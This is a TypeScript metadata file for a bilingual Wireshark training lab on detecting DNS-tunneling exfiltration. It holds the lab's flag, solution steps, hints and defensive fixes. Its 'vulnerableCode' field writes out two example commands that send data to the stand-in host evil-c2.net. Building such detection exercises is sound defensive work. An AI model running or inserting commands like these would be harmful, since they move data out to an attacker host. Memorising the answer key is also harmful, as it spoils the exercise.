// src/modules/practice-labs/wireshark/labs/lab5/lab5.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab5Metadata: LabMetadata = {
  slug: 'wireshark-lab5-stolen-flag',
  title: 'Stolen Flag',
  ar_title: 'العلم المسروق',
  description: 'Hunt for the stolen flag in captured network traffic using advanced Wireshark analysis techniques.',
  ar_description: 'ابحث عن العلم المسروق في حركة مرور الشبكة الملتقطة باستخدام تقنيات تحليل Wireshark المتقدمة.',
  difficulty: 'ADVANCED',
  category: 'NETWORK_SECURITY',
  executionMode: 'SHARED_BACKEND',
  skills: ['Wireshark', 'DNS Analysis', 'Base64 Decoding', 'Data Exfiltration Detection', 'DNS Tunneling', 'Network Forensics'],
  xpReward: 150,
  pointsReward: 150,
  duration: 45,
  isPublished: true,
  goal: 'Detect DNS exfiltration in the packet capture, decode the exfiltrated data, and recover the stolen flag.',
  ar_goal: 'اكتشف إخراج البيانات عبر DNS في التقاط الحزم، وفك ترميز البيانات المُسرَّبة، واستعِد الفلاج المسروق.',
  flagAnswer: 'FLAG{WIRESHARK-LAB5-DNS-EXFIL}',
  briefing: {
    en: 'A malware sample was executed on an internal workstation. The SOC detected suspicious DNS queries to an unknown external domain. A network capture was collected. Investigate the DNS traffic and recover the exfiltrated data.',
    ar: 'تم تنفيذ عينة من البرامج الضارة على محطة عمل داخلية. اكتشف فريق SOC استعلامات DNS مشبوهة إلى نطاق خارجي غير معروف. تم جمع التقاط شبكة. حقق في حركة مرور DNS واستعِد البيانات المُسرَّبة.',
  },
  stepsOverview: {
    en: [
      'Observe all traffic — mixed HTTP, TCP, and DNS',
      'Filter by DNS to isolate DNS queries',
      'Spot the suspicious TXT queries — unusually long encoded subdomains to evil-c2.net',
      'Decode each base64 subdomain separately',
      'Combine both decoded parts to reconstruct the full flag',
    ],
    ar: [
      'راقب جميع حركة المرور — HTTP وTCP وDNS مختلطة',
      'صفّي بـ DNS لعزل استعلامات DNS',
      'الاحظ استعلامات TXT المشبوهة — نطاقات فرعية طويلة ومشفرة تتجه إلى evil-c2.net',
      'فك ترميز كل نطاق فرعي base64 على حدة',
      'ادمج الجزأين المفككَي الترميز لإعادة بناء الفلاج الكامل',
    ],
  },
  solution: {
    context: 'DNS Tunneling encodes exfiltrated data as base64 subdomains in TXT DNS queries to bypass firewalls that only block HTTP/HTTPS.',
    vulnerableCode: 'dig TXT ZMXYZ123abc.exfil.evil-c2.net\ndig TXT DEFGH456xyz.exfil.evil-c2.net',
    exploitation: 'Filter DNS → find TXT queries to evil-c2.net → extract subdomain portion → base64 decode each → concatenate both decoded strings → that is the flag.',
    steps: {
      en: [
        'Filter: protocol = DNS',
        'Find packets #7 and #9 — TXT queries to evil-c2.net with encoded subdomains',
        'Extract the subdomain from each query (part before .exfil.evil-c2.net)',
        'Base64 decode part 1: atob(part1)',
        'Base64 decode part 2: atob(part2)',
        'Concatenate: decoded1 + decoded2 = FLAG{...}',
      ],
      ar: [
        'صفّي: protocol = DNS',
        'ابحث عن الحزم #7 و#9 — استعلامات TXT إلى evil-c2.net بنطاقات فرعية مشفرة',
        'استخرج النطاق الفرعي من كل استعلام (الجزء قبل .exfil.evil-c2.net)',
        'فك ترميز الجزء 1: atob(part1)',
        'فك ترميز الجزء 2: atob(part2)',
        'اربطهما: decoded1 + decoded2 = FLAG{...}',
      ],
    },
    fix: [
      'Block DNS TXT queries to external resolvers at the firewall.',
      'Use DNS filtering (Cisco Umbrella, Pi-hole, Cloudflare Gateway) to block C2 domains.',
      'Monitor for long/encoded subdomains using SIEM rules: subdomain length > 30 chars.',
      'Restrict DNS to only trusted internal resolvers.',
      'Deploy DNS security tools: dnstop, PassiveDNS, Zeek dns.log analysis.',
    ],
  },
  postSolve: {
    explanation: {
      en: 'DNS Tunneling is a data exfiltration technique that encodes payload into DNS queries/responses. It bypasses firewalls because DNS (port 53) is rarely blocked. Each query carries a small chunk of data as a base64-encoded subdomain.',
      ar: 'DNS Tunneling تقنية إخراج بيانات تشفر الحمولة في استعلامات/استجابات DNS. تتجاوز جدران الحماية لأن DNS (المنفذ 53) نادرًا ما يُحجب. يحمل كل استعلام جزءًا صغيرًا من البيانات كنطاق فرعي مشفر بـ base64.',
    },
    impact: {
      en: 'Malware can exfiltrate sensitive data, maintain C2 communication, and create reverse shells — all through standard DNS traffic that appears normal to most security tools.',
      ar: 'يمكن للبرامج الضارة إخراج بيانات حساسة والحفاظ على اتصال C2 وإنشاء reverse shells — كل ذلك عبر حركة مرور DNS عادية تبدو طبيعية لمعظم أدوات الأمان.',
    },
    fix: [
      'DNS-over-HTTPS (DoH) monitoring to detect encrypted tunnels.',
      'Behavioral analysis: flag IPs with >50 unique DNS queries/minute.',
      'Threat intelligence feeds to block known C2 domains.',
      'Network segmentation to prevent workstations from reaching external resolvers directly.',
    ],
  },
  initialState: {},
  hints: [
    { order: 1, content: 'Filter by DNS. How many DNS queries go to evil-c2.net? That domain is suspicious.', xpCost: 5 },
    { order: 2, content: 'The suspicious queries are TXT type. Look at the full query string — the subdomain before .exfil.evil-c2.net looks like base64 encoded data.', xpCost: 15 },
    { order: 3, content: 'There are 2 TXT queries. Decode each subdomain with base64 and concatenate them in order (packet #7 first, then #9).', xpCost: 30 },
  ],
};
